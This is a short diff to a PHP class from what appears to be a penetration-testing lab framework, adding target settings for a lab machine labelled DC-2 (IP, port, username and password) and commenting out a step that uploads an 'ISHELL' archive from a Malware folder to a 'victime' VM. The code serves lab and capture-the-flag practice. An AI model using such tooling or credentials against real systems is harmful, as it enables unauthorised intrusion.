@@ -64,7 +64,7 @@ class poc4lan extends poc4web {
     
     
     public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
-        $this->gitre(__FUNCTION__);
+        $this->gtitre(__FUNCTION__);
         
         $eth = trim($eth);
         $domain = trim($domain);
@@ -78,11 +78,11 @@ class poc4lan extends poc4web {
         $vm = trim($vm);
         $this->titre(__FUNCTION__);
         
-        $victime = new vm($vm);
-        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
+        //$victime = new vm($vm);
+        //$victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
         
         $flag_poc = FALSE;
-        $flag_poc = TRUE;
+        //$flag_poc = TRUE;
         
         $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
         $test->poc($flag_poc);
@@ -872,6 +872,20 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $titre = "restricted Bash - rbash";
         $fonction2exec = "lan2start";
         $vm = "";
+        
+        
+        $ip = "10.60.10.141"; // DC-2 -> TP
+        $port = "7744";
+        $protocol = "T";
+        
+        
+        $login = "tom" ;
+        $pass = 'parturient';
+        $titre = "restricted Bash - rbash";
+        $fonction2exec = "lan2start";
+        $vm = "";
+        
+        
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
     }
